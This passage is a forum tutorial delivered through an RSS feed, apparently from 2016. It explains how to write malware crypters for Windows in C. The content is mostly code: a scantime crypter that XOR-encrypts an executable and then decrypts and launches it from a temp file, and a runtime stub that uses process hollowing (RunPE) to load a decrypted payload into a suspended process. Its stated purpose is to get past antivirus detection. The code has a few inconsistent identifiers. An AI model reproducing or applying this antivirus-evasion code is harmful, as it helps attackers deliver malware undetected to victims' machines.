+<p>These crypters take it to the next level to deobfuscate the data on run in memory as it is required. By doing so, the antivirus will allow it to be loaded and executed <em>before</em> it is able to react to any malicious activity. In this stage, it is pretty much game over if an application is quick enough to administer its payload and complete its objective. It is entirely possible for the malware to trigger a heuristic-based detection from the antivirus software in the execution stage and so malware authors should be careful.</p>
+<p>Now that we’ve covered the high level, let’s see an example implementation of both types.</p>
+<hr>
+<p>#<span class="hashtag">#Coding</span> a Scantime Crypter<br>
+The scantime crypter is the easier of the two since it does not require the knowledge of virtual memory and processes/threads. Essentially, the stub will deobfuscate the file, drop it onto disk somewhere and then execute it. The following documents a possible scantime crypter design.</p>
+<p><strong>Note</strong>: For the sake of cleanliness and readability, I will not be including error checks.</p>
+<p>##<span class="hashtag">#Crypter</span> and Stub Pseudocode</p>
+<pre><code class="lang-makefile">1. Check if there is a command line argument
++-&gt; 2. If there is a command line argument, act as a crypter to crypt the file
+|   3. Open the target file
+|   4. Read file contents
+|   5. Encrypt the file contents
+|   6. Create a new file
+|   7. Write the encrypted into the new file
+|   8. Finish
+|
++-&gt; 2. If there is no command line argument, act as the stub
+    3. Open encrypted file
+    4. Read file contents
+    5. Decrypt the file contents
+    6. Create a temporary file
+    7. Write the decrypted into the temporary file
+    8. Execute the file
+    9. Finish
+</code></pre>
+<p>This design implements both the crypter and the stub in the same executable and we can do so because the two routines are pretty similar to each other. Let’s go through a possible design in code.</p>
+<p>First, we will need to define main and the two conditions which define the execution as a crypter or a stub.</p>
+<pre><code class="lang-auto">int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+    if (__argc &lt; 2) {
+        // stub routine
+    } else {
+        // crypter routine
+    }
+
+    return EXIT_SUCCESS;
+}
+</code></pre>
+<p>Since we are defining the application as a window-based application, we cannot retrieve the <code>argc</code> and <code>argv</code> as we normally would in a console-based application but Microsoft has provided a solution to that with <code>__argc</code> and <code>__argv</code>. If the command line argument <code>__argv[1]</code> exists, the application will attempt to crypt the specified file, else, it will try to decrypt an existing crypted file.</p>
+<p>Moving onto the crypter routine, we’ll require the handle to the specified file of <code>__argv[1]</code> and its size so we can copy its bytes into a buffer to crypt.</p>
+<pre><code class="lang-auto">int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+    if (__argc &lt; 2) {
+        // stub routine
+    } else {
+        // crypter routine
+        // open file to crypt
+        HANDLE hFile = CreateFile(__argv[1], FILE_READ_ACCESS, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+        // get file size
+        DWORD dwFileSize = GetFileSize(hFile, NULL);
+        
+        // crypt and get crypted bytes
+        LPVOID lpFileBytes = Crypt(hFile, dwFileSize);
+    }
+
+    return EXIT_SUCCESS;
+}
+</code></pre>
+<p>The <code>Crypt</code> function will essentially read the file contents into a buffer and then crypt them and then return a pointer to the buffer with the encrypted bytes.</p>
+<pre><code class="lang-auto">LPVOID Crypt(HANDLE hFile, DWORD dwFileSize) {
+    // allocate buffer for file contents
+    LPVOID lpFileBytes = malloc(dwFileSize);
+    // read the file into the buffer
+    ReadFile(hFile, lpFileBytes, dwFileSize, NULL, NULL);
+
+    // apply XOR encryption
+    int i;
+    for (i = 0; i &lt; dwFileSize; i++) {
+        *((LPBYTE)lpFileBytes + i) ^= Key[i % sizeof(Key)];
+    }
+
+    return lpFileBytes;
+}
+</code></pre>
+<p>Now that we have the encrypted bytes, we will need to create a new file and then write these bytes into it.</p>
+<pre><code class="lang-auto">int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+    if (__argc &lt; 2) {
+        // stub routine
+    } else {
+        // crypter routine
+        
+        ...
+
+        // get crypted file name in current directory
+        CHAR szCryptedFileName[MAX_PATH];
+        GetCurrentDirectory(MAX_PATH, szCryptedFileName);
+        strcat(szCryptedFileName, "\\");
+        strcat(szCryptedFileName, CRYPTED_FILE);
+        // open handle to new crypted file
+        HANDLE hCryptedFile = CreateFile(szCryptedFileName, FILE_WRITE_ACCESS, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+
+        // write to crypted file
+        WriteFile(hCryptedFile, lpFileBytes, dwFileSize, NULL, NULL);
+        CloseHandle(hCryptedFile);
+        free(lpFileBytes);
+    }
+
+    return EXIT_SUCCESS;
+}
+</code></pre>
+<p>And that’s pretty much it for the crypter section. Note that we’ve used a simple XOR to encrypt the contents of the file which <em>might</em> not be enough if we have a small key. If we wanted to be more on the safe side, we can use other encryption schemes such as RC4 or (x)TEA. We do not require full-fledged unbroken cryptoalgorithms since the purpose is to avoid signature-based detection and would hence be complete overkill. Keep it small and simple.</p>
+<p>Let’s continue onto the stub routine. For the stub, we want to retrieve the encrypted file in its current directory and then write the decrypted contents into a temporary file for execution.</p>
+<p>We’ll begin by getting the current director, then opening the file and getting the file size.</p>
+<pre><code class="lang-auto">int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+    if (__argc &lt; 2) {
+        // stub routine
+        // get target encrypted file
+        CHAR szEncryptedFileName[MAX_PATH];
+        GetCurrentDirectory(MAX_PATH, szEncryptedFileName);
+        strcat(szEncryptedFileName, "\\");
+        strcat(szEncryptedFileName, CRYPTED_FILE);
+
+        // get handle to file
+        HANDLE hFile = CreateFile(szEncryptedFileName, FILE_READ_ACCESS, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+
+        // get file size
+        DWORD dwFileSize = GetFileSize(hFile, NULL);
+    } else {
+        // crypter routine
+    }
+
+    return EXIT_SUCCESS;
+}
+</code></pre>
+<p>Pretty much the same as the crypter routine. Next, we will read the file contents and get the decrypted bytes. Since the XOR operation restores values given a common bit, we can simply reuse the <code>Crypt</code> function. After that, we will need to create a temporary file and write the decrypted bytes into it.</p>
+<pre><code class="lang-auto">int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+    if (__argc &lt; 2) {
+        // stub routine
+        
+        ...
+
+        // decrypt and obtain decrypted bytes
+        LPVOID lpFileBytes = Crypt(hFile, dwFileSize);
+        CloseHandle(hFile);
+
+        // get file in temporary directory
+        CHAR szTempFileName[MAX_PATH];
+        GetTempPath(MAX_PATH, szTempFileName);
+        strcat(szTempFileName, DECRYPTED_FILE);
+
+        // open handle to temp file
+        HANDLE hTempFile = CreateFile(szTempFileName, FILE_WRITE_ACCESS, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+        // write to temporary file
+        WriteFile(hTempFile, lpFileBytes, dwFileSize, NULL, NULL);
+        // clean up
+        CloseHandle(hTempFile);
+        free(lpFileBytes);
+    } else {
+        // crypter routine
+    }
+
+    return EXIT_SUCCESS;
+}
+</code></pre>
+<p>Finally, we’ll need to execute the decrypted application.</p>
+<pre><code class="lang-auto">int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+    if (__argc &lt; 2) {
+        // stub routine
+        
+        ...
+
+        // execute file
+        ShellExecute(NULL, NULL, szTempFileName, NULL, NULL, 0);
+    } else {
+        // crypter routine
+    }
+
+    return EXIT_SUCCESS;
+}
+</code></pre>
+<p>Do note that once the decrypted application has been written to disk, it will be completely exposed to antivirus software’s signature-based detection and is likely to catch most malware. Because of this, malware authors require something which will allow the execution of their application(s) without this flaw.</p>
+<p>This concludes the scantime crypter.</p>
+<hr>
+<h2>Coding a Runtime Crypter</h2>
+<p>For the runtime crypter, I will only cover the stub since that includes the more complex material so we will assume the application has already been encrypted. A popular technique which these crypters use is called <em>RunPE</em> or <em>Dynamic Forking/Process Hollowing</em>. How this works is the stub will first decrypt an application’s encrypted bytes and then emulate the Windows loader by pushing them into the virtual memory space of a suspended process. Once that has been completed, the stub will resume the suspended process and finish.</p>
+<p><strong>Note</strong>: For the sake of cleanliness and readability, I will not be including error checks.</p>
+<p>##<span class="hashtag">#Stub</span> Pseudocode</p>
+<pre><code class="lang-makefile">1. Decrypt application
+2. Create suspended process
+3. Preserve process's thread context
+4. Hollow out process's virtual memory space
+5. Allocate virtual memory
+6. Write application's header and sections into allocated memory
+7. Set modified thread context
+8. Resume process
+9. Finish
+</code></pre>
+<p>As we can see, this requires quite a bit of knowledge of Windows internals, including the PE file structure, Windows memory manipulation and processes/threads. I would highly recommend the reader to cover these fundamentals to understand the following material.</p>
+<p>Firstly, let’s set up two routines in main, one for decrypting the encrypted application and the other to load it into memory for execution.</p>
+<pre><code class="lang-auto">int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+    Decrypt();
+    RunPE();
+
+    return EXIT_SUCCESS;
+}
+</code></pre>
+<p>The <code>Decrypt</code> function will be entirely dependent on the encryption scheme used to encrypt the application but here is an example code using XOR.</p>
+<pre><code class="lang-auto">VOID Decrypt(VOID) {
+    int i;
+    for (i = 0; i &lt; sizeof(Shellcode); i++) {
+        Shellcode[i] ^= Key[i % sizeof(Key)];
+    }
+}
+</code></pre>
+<p>Now that the application has been decrypted, let’s take a look at where the magic happens.<br>
+Here, we will verify that the application is a valid PE file by checking the DOS and PE signatures.</p>
+<pre><code class="lang-auto">VOID RunPE(VOID) {
+    // check valid DOS signature
+    PIMAGE_DOS_HEADER pidh = (PIMAGE_DOS_HEADER)Shellcode;
+    if (pidh-&gt;e_magic != IMAGE_DOS_SIGNATURE) return;
+
+    // check valid PE signature
+    PIMAGE_NT_HEADERS pinh = (PIMAGE_NT_HEADERS)((DWORD)Shellcode + pidh-&gt;e_lfanew);
+    if (pinh-&gt;Signature != IMAGE_NT_SIGNATURE) return;
+}
+</code></pre>
+<p>Now, we will create the suspended process.</p>
+<pre><code class="lang-auto">VOID RunPE(VOID) {
+    ...
+
+    // get own full file name
+    CHAR szFileName[MAX_PATH];
+    GetModuleFileName(NULL, szFileName, MAX_PATH);
+
+    // initialize startup and process information
+    STARTUPINFO si;
+    PROCESS_INFORMATION pi;
+    ZeroMemory(&amp;si, sizeof(si));
+    ZeroMemory(&amp;pi, sizeof(pi));
+    // required to set size of si.cb before use
+    si.cb = sizeof(si);
+    // create suspended process
+    CreateProcess(szFileName, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &amp;si, &amp;pi);
+
+}
+</code></pre>
+<p>Note that <code>szFileName</code> can be a full path to any executable file such as <code>explorer.exe</code> or <code>iexplore.exe</code> but for this example, we will be using the stub’s file. The <code>CreateProcess</code> function will create a child process of the specified file in a suspended state so that we can modify its virtual memory contents to our needs. Once that has been achieved, we should obtain its thread context before changing anything.</p>
+<pre><code class="lang-auto">VOID RunPE(VOID) {
+    ...
+
+    // obtain thread context
+    CONTEXT ctx;
+    ctx.ContextFlags = CONTEXT_FULL;
+    GetThreadContext(pi.Thread, &amp;ctx);
+
+}
+</code></pre>
+<p>And now will hollow out an area of the process’s virtual memory so we can allocate our own space for the application. For this, we require a function which is not readily available to us so we will require a function pointer to point to a dynamically retrieved function from the <code>ntdll.dll</code> DLL.</p>
+<pre><code class="lang-auto">typedef NTSTATUS (*fZwUnmapViewOfSection)(HANDLE, PVOID);
+
+VOID RunPE(VOID) {
+    ...
+
+    // dynamically retrieve ZwUnmapViewOfSection function from ntdll.dll
+    fZwUnmapViewOfSection pZwUnmapViewOfSection = (fZwUnmapViewOfSection)GetProcAddress(GetModuleHandle("ntdll.dll"), "ZwUnmapViewOfSection");
+    // hollow process at virtual memory address 'pinh-&gt;OptionalHeader.ImageBase'
+    pZwUnMapViewOfSection(pi.hProcess, (PVOID)pinh-&gt;OptionalHeader.ImageBase);
+
+    // allocate virtual memory at address 'pinh-&gt;OptionalHeader.ImageBase' of size `pinh-&gt;OptionalHeader.SizeofImage` with RWX permissions
+    LPVOID lpBaseAddress = VirtualAllocEx(pi.hProcess, (LPVOID)pinh-&gt;OptionalHeader.ImageBase, pinh-&gt;OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+
+}
+</code></pre>
+<p>Since the suspended process has its own content inside its virtual memory space, we are required to unmap it from memory and then allocate our own so that we have the correct access and permissions to load our application’s image. We will do this with the <code>WriteProcessMemory</code> function. First, we need to write the headers and then each section individually as the Windows loader would. This section requires a thorough understanding of the PE file structure.</p>
+<pre><code class="lang-auto">VOID RunPE(VOID) {
+    ...
+
+    // write header
+    WriteProcessMemory(pi.hProcess, (LPVOID)pinh-&gt;OptionalHeader.ImageBase, Shellcode, pinh-&gt;OptionalHeader.SizeOfHeaders, NULL);
+
+    // write each section
+    int i;
+    for (i = 0; i &lt; pinh-&gt;FileHeader.NumberOfSections; i++) {
+        // calculate and get ith section
+        PIMAGE_SECTION_HEADER pish = (PIMAGE_SECTION_HEADER)((DWORD)Shellcode + pidh-&gt;e_lfanew + sizeof(IMAGE_NT_HEADERS) + sizeof(IMAGE_SECTION_HEADER) * i);
+        // write section data
+        WriteProcessMemory(pi.hProcess, (LPVOID)(lpBaseAddress + pish-&gt;VirtualAddress), (LPVOID)((DWORD)Shellcode + pish-&gt;PointerToRawData), pish-&gt;SizeOfRawData, NULL);
+    }
+
+}
+</code></pre>
+<p>Now that everything is in place, we will simply modify the context’s address of entry point and then resume the suspended thread.</p>
+<pre><code class="lang-auto">VOID RunPE(VOID) {
+    ...
+ 
+    // set appropriate address of entry point
+    ctx.Eax = pinh-&gt;OptionalHeader.ImageBase + pinh-&gt;OptionalHeader.AddressOfEntryPoint;
+    SetThreadContext(pi.hThread, &amp;ctx);
+ 
+    // resume and execute our application
+    ResumeThread(pi.hThread);
+}
+</code></pre>
+<p>Now, the application is running within memory and hopefully, antivirus software will not detect it as it unleashes itself.</p>
+<hr>
+<p>#<span class="hashtag">#Conclusion</span><br>
+Hopefully, at least the high level and some low level concepts have been communicated well enough for the reader to understand. If some things are still completely incomprehensible, I would highly encourage self-research on the listed topics at the beginning of this paper. If some small things are a bit unclear, do not hesitate to ask. This was not targeted at a beginner-level audience.</p>
+<p>Thank you for reading.</p>
+<p><em>– dtm</em></p>
+          <p><a href="https://d.clarkee.co.uk/t/crypters-instruments-of-the-underground/386/1">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/crypters-instruments-of-the-underground/386/1</link>
+        <pubDate>Wed, 18 May 2016 04:21:52 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-386-1</guid>
+        <source url="https://d.clarkee.co.uk/t/crypters-instruments-of-the-underground/386.rss">Crypters - Instruments of the Underground</source>
+      </item>
+  </channel>
+</rss>
